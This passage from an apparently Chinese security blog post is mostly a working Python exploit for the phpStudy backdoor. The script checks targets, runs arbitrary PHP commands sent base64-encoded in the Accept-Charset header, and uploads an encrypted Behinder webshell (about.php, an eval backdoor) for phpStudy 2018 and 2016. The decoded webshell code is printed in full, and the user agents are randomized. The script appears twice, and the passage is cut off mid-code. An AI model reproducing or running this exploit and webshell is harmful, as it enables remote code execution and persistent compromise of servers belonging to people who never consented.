Gecko/20080705 Firefox/3.0 Kapiko/3.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20"</span>,</span><br><span class="line">    <span class="string">"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"</span></span><br><span class="line">]</span><br><span class="line">TIME_OUT=<span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phpstudy_backdoor_getshell</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url,command)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">        self._command = command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#访问器 - getter()方法</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#修改器 - setter()方法</span></span><br><span class="line"><span class="meta">    @url.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @command.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self,command)</span>:</span></span><br><span class="line">        self._command = command</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_Target</span><span class="params">(self)</span>:</span></span><br><span class="line">        poc = &#123;</span><br><span class="line">            <span class="string">"Accept-Charset"</span>: <span class="string">"cGhwaW5mbygpOw=="</span>,</span><br><span class="line">            <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip,deflate"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            PocRequest = requests.get(self._url,headers=poc,timeout=TIME_OUT)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"phpinfo"</span> <span class="keyword">in</span> str(PocRequest.content):</span><br><span class="line">                print(<span class="string">'[+] Target is vulnerable.'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] Target is NOT vulnerable.'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = self._command</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Command Execute Successful.'</span>)</span><br><span class="line">                print(response.text)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell_2018</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = <span class="string">'ZmlsZV9wdXRfY29udGVudHMoJy4vUEhQVHV0b3JpYWwvV1dXL2Fib3V0LnBocCcsICc8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOwpzZXNzaW9uX3N0YXJ0KCk7CmlmIChpc3NldCgkX0dFVFsicGFzcyJdKSkKewogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7CiAgICAkX1NFU1NJT05bImsiXT0ka2V5OwogICAgcHJpbnQgJGtleTsKfQplbHNlCnsKICAgICRrZXk9JF9TRVNTSU9OWyJrIl07CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCJvcGVuc3NsIikpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoInwiLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319CglAbmV3IEMoJHBhcmFtcyk7Cn0KPz4nKTs='</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Upload Successful.'</span>)</span><br><span class="line">                print(<span class="string">'[+] The webshell is &#123;&#125;//&#123;&#125;/about.php'</span>.format(self._url.split(<span class="string">'/'</span>)[<span class="number">0</span>],self._url.split(<span class="string">'/'</span>)[<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell_2016</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = <span class="string">'ZmlsZV9wdXRfY29udGVudHMoJy4vV1dXL2Fib3V0LnBocCcsICc8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOwpzZXNzaW9uX3N0YXJ0KCk7CmlmIChpc3NldCgkX0dFVFsicGFzcyJdKSkKewogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7CiAgICAkX1NFU1NJT05bImsiXT0ka2V5OwogICAgcHJpbnQgJGtleTsKfQplbHNlCnsKICAgICRrZXk9JF9TRVNTSU9OWyJrIl07CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCJvcGVuc3NsIikpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoInwiLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319CglAbmV3IEMoJHBhcmFtcyk7Cn0KPz4nKTs='</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Upload Successful.'</span>)</span><br><span class="line">                print(<span class="string">'[+] The webshell is &#123;&#125;//&#123;&#125;/about.php'</span>.format(self._url.split(<span class="string">'/'</span>)[<span class="number">0</span>],self._url.split(<span class="string">'/'</span>)[<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    parse = argparse.ArgumentParser(description=<span class="string">'EXP for phpstudy_backdoor.'</span>)</span><br><span class="line">    parse.usage=<span class="string">"""phpstudy_backdoor_getshell.py [-h] [-u URL] [-c ...]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       example: python3 phpstudy_backdoor_getshell.py -u http://192.168.1.103/index.php -c 'system(\\"whoami\\");'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       使用反斜杠和单双引号防止转义的问题，并解决argparse下以空格解析参数不能当做一个字符串的问题</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    parse.add_argument(<span class="string">'-u'</span>,<span class="string">'--url'</span>,help=<span class="string">'The Target Url'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-c'</span>,<span class="string">'--command'</span>, nargs=argparse.REMAINDER,help=<span class="string">'Please input the exploit command'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-w8'</span>,<span class="string">'--webshell_8'</span>,action=<span class="string">'store_true'</span>,help=<span class="string">'upload a Behinder webshell for phpstudy2018'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-w6'</span>,<span class="string">'--webshell_6'</span>,action=<span class="string">'store_true'</span>,help=<span class="string">'upload a Behinder webshell for phpstudy2016'</span>)</span><br><span class="line">    args = parse.parse_args()</span><br><span class="line"></span><br><span class="line">    x = phpstudy_backdoor_getshell(<span class="string">''</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        print(parse.print_help())</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) &lt; <span class="number">4</span> <span class="keyword">and</span> len(sys.argv) &gt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> args.url:</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.check_Target()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[-] some error!'</span>)</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) &gt;= <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> args.url <span class="keyword">and</span> args.command:</span><br><span class="line">            commands = <span class="string">''</span> </span><br><span class="line">            <span class="keyword">for</span> cmd <span class="keyword">in</span> args.command:</span><br><span class="line">                commands += cmd + <span class="string">' '</span></span><br><span class="line">            command = base64.b64encode(commands.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.command = command</span><br><span class="line">            x.exploit()</span><br><span class="line">        <span class="keyword">elif</span> args.url <span class="keyword">and</span> args.webshell_8:</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.upload_shell_2018()</span><br><span class="line">        <span class="keyword">elif</span> args.url <span class="keyword">and</span> args.webshell_6:</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.upload_shell_2016()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[-] some error!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>phpstudy 2018</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983146.36.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983187.58.png" alt></p>
<p>phpstudy 2016</p>
<blockquote>
<p>唯一有变化的就是上传shell的时候，根路径和2018不一样,路径修改如下</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file_put_contents(<span class="string">'./WWW/about.php'</span>, <span class="string">'&lt;?php</span></span><br><span class="line"><span class="string">@error_reporting(0);</span></span><br><span class="line"><span class="string">session_start();</span></span><br><span class="line"><span class="string">if (isset($_GET["pass"]))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    $key=substr(md5(uniqid(rand())),16);</span></span><br><span class="line"><span class="string">    $_SESSION["k"]=$key;</span></span><br><span class="line"><span class="string">    print $key;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    $key=$_SESSION["k"];</span></span><br><span class="line"><span class="string">	$post=file_get_contents("php://input");</span></span><br><span class="line"><span class="string">	if(!extension_loaded("openssl"))</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		$t="base64_"."decode";</span></span><br><span class="line"><span class="string">		$post=$t($post."");</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string">		for($i=0;$i&lt;strlen($post);$i++) &#123;</span></span><br><span class="line"><span class="string">    			 $post[$i] = $post[$i]^$key[$i+1&amp;15]; </span></span><br><span class="line"><span class="string">    			&#125;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	else</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		$post=openssl_decrypt($post, "AES128", $key);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">    $arr=explode("|",$post);</span></span><br><span class="line"><span class="string">    $func=$arr[0];</span></span><br><span class="line"><span class="string">    $params=$arr[1];</span></span><br><span class="line"><span class="string">	class C&#123;public function __construct($p) &#123;eval($p."");&#125;&#125;</span></span><br><span class="line"><span class="string">	@new C($params);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;'</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983388.91.png" alt></p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983409.4.png" alt></p>
<h4 id="不带参数检测、利用、传shell"><a href="#不带参数检测、利用、传shell" class="headerlink" title="不带参数检测、利用、传shell"></a>不带参数检测、利用、传shell</h4><blockquote>
<p>和带参数的效果一样，就不放图了，不同的是执行命令传shell时没有解析参数时被转义的问题了</p>
</blockquote>
<p>code</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@Description: </span></span><br><span class="line"><span class="string">@Author: demos</span></span><br><span class="line"><span class="string">@Github: https://github.com/demossl</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20"</span>,</span><br><span class="line">    <span class="string">"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"</span></span><br><span class="line">]</span><br><span class="line">TIME_OUT=<span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phpstudy_backdoor_getshell</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url,command)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">        self._command = command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#访问器 - getter()方法</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#修改器 - setter()方法</span></span><br><span class="line"><span class="meta">    @url.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @command.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self,command)</span>:</span></span><br><span class="line">        self._command = command</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_Target</span><span class="params">(self)</span>:</span></span><br><span class="line">        poc = &#123;</span><br><span class="line">            <span class="string">"Accept-Charset"</span>: <span 